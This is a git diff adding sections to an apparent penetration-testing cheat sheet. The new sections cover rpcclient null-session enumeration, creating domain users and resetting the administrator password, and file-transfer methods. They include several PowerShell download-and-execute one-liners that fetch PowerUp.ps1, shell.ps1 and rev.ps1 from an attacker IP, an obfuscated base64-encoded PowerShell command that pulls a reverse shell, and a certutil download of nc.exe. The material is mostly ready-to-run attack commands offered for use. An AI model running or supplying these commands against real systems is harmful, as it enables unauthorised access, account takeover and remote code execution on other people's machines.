@@ -776,6 +776,27 @@ ldapsearch -x -H ldap://ipaddress -D ‘domain\user’ -w ‘password’ -b base
 ~~~
 NOTE: pay particular attention to ‘no’ backslash at the end of ldap address, anr the -D value must have backslash in it, in addition in the example domain: return.local, try return.local\user OR return\user
 
+### rpcclient
+~~~
+rpcclient -N 10.10.10.10 -U ''
+
+then
+
+enumdomusers
+enumdomgroups
+enumprivs
+queryuser [0x1f4]
+getdompwinfo
+lsaenumsid #localusers
+
+#create new user
+createdom user username
+setuserinfo2 username 23 'newpassword'
+
+#change userpassword
+setuserinfo2 adminstrator 23 'newpassword'
+~~~
+
 ### Password Cracking
 #### Hashcat
 Hashcat uses GPUs to crack passwords quickly, typically faster than John the Ripper. Only run this if you have direct access to the GPU (as in not from a VM). You can print all available hash types with `hashcat --help`
@@ -801,3 +822,49 @@ John can crack linux shadow passwords after it has been unshadowed:
  unshadow passwd.txt shadow.txt >unshadowed_pws.txt
  john -w=rockyou.txt unshadowed_pws.txt
  ~~~
+
+### File transfers
+#### Netcat
+From listening system:
+~~~
+nc -l -p 1234 > out.file
+~~~
+From sending system:
+~~~
+nc -w 3 [destination] 1234 < out.file
+~~~
+
+#### Using web requests
+Quickly host files with a simple python web server. The following commands in python2 or python3 will start a web server in the current working directory sharing out its files:
+~~~
+python3 -m http.server 8888
+python2 -m SimpleHTTPServer 8888
+~~~~
+Retrieve files with any number of different commands (some examples below) or using a web browser:
+~~~
+wget http://serverip:serverport/filename
+
+curl serverip:serverport/filename
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8000/ipw.ps1')"
+
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerUp.ps1') | powershell -noprofile - #From cmd.exe, download and execute
+
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/shell.ps1')|iex"
+
+iex (iwr '10.10.10.10:8000/ipw.ps1') #powershell
+
+IEX ( IWR http://target:port/file.ps1 -UseBasicParsing) #can invoke directly to memory with usebasicparsing
+
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.10.10:8000/ipw.ps1',$false);$h.send();iex $h.responseText
+
+#encode the command first
+echo "IEX( IWR http://10.10.10.10:8000/rev.ps1 -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0
+Powershell.exe -encodedcommand SQBFAFgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA0ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA=
+
+certutil.exe -urlcache -split -f "http://serverip:serverport/nc.exe" nc.exe
+~~~
+#### Using smb
+~~~
+impacket-smbserver files /dir_to_share #open smb share from linux and read/write to it as needed
+~~~
